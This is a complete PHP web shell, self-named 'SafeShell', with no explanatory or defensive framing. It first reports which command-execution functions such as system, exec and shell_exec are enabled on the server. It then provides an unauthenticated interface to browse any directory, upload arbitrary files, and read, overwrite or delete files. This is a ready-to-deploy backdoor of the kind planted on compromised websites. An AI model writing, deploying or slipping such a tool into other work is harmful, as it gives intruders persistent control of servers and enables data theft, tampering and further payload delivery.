<?php
// ------------------- EXEC FUNCTION CHECK -------------------
echo "<h2>🔍 Disabled Functions Check</h2>";
$funcs = ['system', 'exec', 'shell_exec', 'passthru', 'proc_open', 'popen'];
echo "<table border='1' cellpadding='5'><tr><th>Function</th><th>Status</th></tr>";
foreach ($funcs as $f) {
    $status = (function_exists($f) && is_callable($f)) ? "✅ ENABLED" : "❌ DISABLED";
    echo "<tr><td>$f</td><td>$status</td></tr>";
}
echo "</table><hr>";

// ------------------- BASIC FILE MANAGER -------------------
$cwd = isset($_GET['d']) ? $_GET['d'] : getcwd();
$cwd = realpath($cwd);
chdir($cwd);
$files = scandir($cwd);
echo "<h2>🗂️ SafeShell - Dir: $cwd</h2>";
echo "<form method='get'><input type='text' name='d' value='$cwd'><button>Go</button></form><hr>";
echo "<form enctype='multipart/form-data' method='post'>
      <input type='file' name='up'><button>Upload</button></form>";

if (isset($_FILES['up'])) {
    $f = $_FILES['up']['name'];
    if (move_uploaded_file($_FILES['up']['tmp_name'], $f)) {
        echo "✅ Uploaded: $f<br>";
    } else {
        echo "❌ Upload failed.<br>";
    }
}

echo "<table border=1 cellpadding=5 cellspacing=0>";
foreach ($files as $file) {
    $path = "$cwd/$file";
    if ($file == ".") continue;
    echo "<tr><td>$file</td><td>";
    if (is_dir($path)) {
        echo "<a href='?d=" . urlencode($path) . "'>[Open]</a>";
    } else {
        echo "<a href='?d=" . urlencode($cwd) . "&view=" . urlencode($file) . "'>[View]</a> ";
        echo "<a href='?d=" . urlencode($cwd) . "&edit=" . urlencode($file) . "'>[Edit]</a> ";
        echo "<a href='?d=" . urlencode($cwd) . "&del=" . urlencode($file) . "' onclick='return confirm(\"Delete?\")'>[Delete]</a>";
    }
    echo "</td></tr>";
}
echo "</table><hr>";

if (isset($_GET['view'])) {
    $f = $cwd . '/' . basename($_GET['view']);
    echo "<h3>📄 View: $f</h3><pre>" . htmlspecialchars(file_get_contents($f)) . "</pre><hr>";
}

if (isset($_GET['edit'])) {
    $f = $cwd . '/' . basename($_GET['edit']);
    if (isset($_POST['save'])) {
        file_put_contents($f, $_POST['data']);
        echo "✅ Saved $f<br><hr>";
    }
    $data = htmlspecialchars(file_get_contents($f));
    echo "<h3>✏️ Edit: $f</h3>
    <form method='post'>
    <textarea name='data' style='width:100%;height:300px;'>$data</textarea><br>
    <button name='save'>Save</button>
    </form><hr>";
}

if (isset($_GET['del'])) {
    $f = $cwd . '/' . basename($_GET['del']);
    if (unlink($f)) {
        echo "✅ Deleted: $f<br>";
    } else {
        echo "❌ Failed to delete: $f<br>";
    }
}
?>

